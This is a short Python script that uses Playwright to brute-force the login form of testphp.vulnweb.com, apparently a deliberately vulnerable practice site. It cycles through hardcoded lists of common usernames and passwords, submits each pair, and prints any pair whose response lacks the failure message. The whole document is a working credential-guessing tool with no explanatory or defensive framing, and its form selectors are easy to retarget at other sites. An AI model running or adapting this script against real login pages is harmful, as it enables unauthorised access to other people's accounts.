from playwright.sync_api import sync_playwright

url="http://testphp.vulnweb.com/login.php"
username_1="input[name='uname']"
passwerd_1="input[name='pass']"
long_btn="input[type='submit']"
text="If you are already"
usernames=['admin','test','user','akh','testr']
passwerds=['12345','test','796678','admin',]
with sync_playwright()as pr:
    brwser=pr.chromium.launch(headless=True)
    page=brwser.new_page()
    page.goto(url)
    for us in usernames:
        for ps in passwerds:
            page.fill(username_1,us)
            page.fill(passwerd_1,ps)
            page.click(long_btn)
            page.wait_for_timeout(2000)
            try:
                if text in page.content():
                    print(f'[-] long Errofor username{us}|passwerd:{ps}')
                else:
                    print(f'[+] long sucesful!Username:{us}|passwerd:{ps}')
                    exit()
            except:
                pass
brwser.close()

